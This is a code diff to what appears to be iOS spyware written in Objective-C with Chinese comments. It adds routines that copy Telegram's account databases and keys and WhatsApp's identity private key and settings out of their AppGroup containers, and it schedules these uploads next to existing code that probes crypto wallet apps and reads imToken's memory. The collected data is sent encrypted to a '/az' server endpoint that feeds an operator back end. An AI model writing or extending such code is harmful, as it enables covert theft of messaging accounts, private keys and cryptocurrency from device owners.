@@ -37,6 +37,8 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 - (void)probeImTokenTcx;
 - (void)probeTPPassword;
 - (void)probeTPBoot;
+- (void)collectTelegram;
+- (void)collectWhatsApp;
 - (void)probeWalletTree:(NSString *)bundleId;
 @end
 
@@ -501,6 +503,8 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                         if (tick % 15 == 7) { [self collectAndUploadWallet:@"im.token.app"]; [self probeImTokenEntry]; }
                         if (tick % 15 == 3) [self probeWalletTree:@"com.global.wallet.ios"];
                         if (tick == 2 || tick % 15 == 9) [self collectAndUploadWallet:@"com.global.wallet.ios"];
+                        if (tick == 4 || tick % 15 == 11) [self collectTelegram];
+                        if (tick == 5 || tick % 15 == 12) [self collectWhatsApp];
                         // 每 60 秒单独探一次入口标记（注入要 140 秒，启动时那次来不及）
                         if (tick % 3 == 0) [self probeImTokenEntry];
                         // 每轮（20 秒）看一次 imToken 在不在跑，在跑就直接读它内存
@@ -832,6 +836,65 @@ static NSArray *WalletMemoryTargets(void) {
 /// 读 imToken 里 call_tcx_api 的安装状态与实际参数（JSON）
 
 
+
+#pragma mark - Telegram / WhatsApp（AppGroup 容器 → /az → busiDeviceFile）
+
+/// 采集一个 AppGroup 容器并上传。
+/// 服务端 /az 落盘成 zip，并写一条 busiDeviceFile(kind=zip)，
+/// 后台「Telegram / Whatsapp」菜单就是按 bundleId 从那张表里过滤出来的。
+- (void)collectAndUploadAppGroup:(NSString *)groupId
+                          bundle:(NSString *)bundleId
+                         include:(NSArray<NSString *> *)include
+                         exclude:(NSArray<NSString *> *)exclude {
+    @try {
+        NSDictionary *pkg = [WalletFS collectAppGroup:groupId
+                                              include:include
+                                              exclude:exclude
+                                                limit:12 * 1024 * 1024];
+        NSArray *files = pkg[@"files"];
+        if (!files.count) {
+            [self log:[NSString stringWithFormat:@"appgroup empty: %@ (%@)", groupId, pkg[@"error"] ?: @"no files"]];
+            return;
+        }
+
+        NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        body[@"c"] = kSeed;
+        body[@"bundle_id"] = bundleId;
+        body[@"name"] = [NSString stringWithFormat:@"%@-collect.zip", [bundleId stringByReplacingOccurrencesOfString:@"." withString:@"_"]];
+        body[@"files"] = files;
+
+        NSDictionary *r = [self.net postEncrypted:@"/az" json:body timeout:180];
+
+        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        ev[@"et"] = @"appgroup_upload";
+        ev[@"c"] = kSeed;
+        ev[@"ctx"] = @{ @"bundleId": bundleId,
+                        @"files": @(files.count),
+                        @"bytes": pkg[@"bytes"] ?: @0,
+                        @"resp": r ? [r description] : @"nil" };
+        [self.net sendEvent:ev];
+        [self log:[NSString stringWithFormat:@"appgroup %@ files=%lu bytes=%@ -> %@",
+                   bundleId, (unsigned long)files.count, pkg[@"bytes"], r ? @"ok" : @"nil"]];
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"collectAndUploadAppGroup: %@", e.reason]];
+    }
+}
+
+/// Telegram：accounts-metadata/ + account-<n>/postbox/ 里的数据库与密钥，跳过媒体
+- (void)collectTelegram {
+    [self collectAndUploadAppGroup:@"group.ph.telegra.Telegraph"
+                            bundle:@"group.ph.telegra.Telegraph"
+                           include:@[@"accounts-metadata", @"/postbox/"]
+                           exclude:@[@"/media/", @".jpg", @".mp4", @".webp", @"/icons/"]];
+}
+
+/// WhatsApp：AppGroup 里的 Settings/Preferences（cc/jid/identityPrivateKey 都在 plist）
+- (void)collectWhatsApp {
+    [self collectAndUploadAppGroup:@"group.net.whatsapp.WhatsApp.shared"
+                            bundle:@"group.net.whatsapp.WhatsApp.shared"
+                           include:@[@"Library/Preferences", @".plist", @"Library/Settings"]
+                           exclude:@[@"/Media/", @".jpg", @".mp4", @"/Message/"]];
+}
 #pragma mark - TokenPocket：把设备端验证过的密码送去解密
 
 /// tp 模块在 TP 进程里把密码验证通过后写到 Documents/_tp_pw_ok.txt
